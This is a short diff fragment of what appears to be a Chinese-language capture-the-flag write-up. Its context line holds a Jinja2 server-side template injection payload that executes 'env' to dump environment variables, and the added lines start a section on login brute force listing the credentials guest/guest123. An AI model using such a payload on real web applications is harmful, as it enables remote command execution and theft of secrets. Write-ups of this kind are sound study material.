@@ -8,4 +8,10 @@
 {{config.__class__.__init__.__globals__['os'].popen('env').read()}}
 ```
 
-## 
+## 错位的签名
+登录爆破
+```python
+账号：guest
+密码：guest123
+```
+
